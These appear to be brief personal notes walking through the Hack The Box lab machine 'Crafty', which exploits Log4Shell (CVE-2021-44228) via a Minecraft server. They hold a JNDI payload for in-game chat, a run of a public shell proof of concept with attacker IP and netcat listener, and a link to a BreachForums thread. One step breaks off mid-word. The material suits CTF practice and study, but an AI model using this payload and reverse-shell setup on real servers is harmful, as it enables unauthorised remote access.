
Vulnerability: CVE-2021-44228 (Minecraft)




Crafty Overall path towards gaining user:
1. Download TLauncher from https://tlauncher.org/jar
2. Clone this https://github.com/kozmer/log4j-shell-poc , change poc.py line 26 from String cmd="/bin/sh"; to String cmd="cmd.exe";
3. Download JDK 8: wget -c --no-cookies --no-check-certificate --header "Cookie: oraclelicense=accept-securebackup-cookie" https://download.oracle.com/otn/java/jdk...x64.tar.gz
4. Execute log4j exploit like: python3 poc.py --userip [Your VPN IP] --webport 8000 --lport 9001 (Remember to open nc listener on port 9001)
5. When ex 
6. Using JDK 8 run the TLauncher, jar file and select the Fabric 1.16.5 from Version and install it. After installation run the Game. Press T for chat and enter: ${jndi:ldap://your vpn ip:1389/a}. You should receive rev shell as svc_minecraft (User Flag Owned) 
   
   https://breachforums.cx/Thread-HTB-Crafty
   
   
# IMG
![[Pasted image 20240309144937.png]]

   
   
Add Server
![[Pasted image 20240309145213.png]]
![[Pasted image 20240309234035.png]]![[Pasted image 20240309234106.png]]
![[Pasted image 20240310001816.png]]

![[Pasted image 20240310003232.png]]

![[Pasted image 20240310003354.png]]

![[Pasted image 20240310003432.png]]
![[Pasted image 20240310003533.png]]